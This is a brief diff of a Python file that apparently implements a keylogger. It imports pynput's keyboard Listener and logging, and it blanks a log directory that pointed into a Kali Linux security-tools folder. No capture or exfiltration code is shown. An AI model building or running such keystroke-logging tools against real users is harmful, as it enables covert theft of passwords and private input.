@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = "/home/kali/Documents/Scripts_Tools/security/"
+log_dir = ""
 
 
 
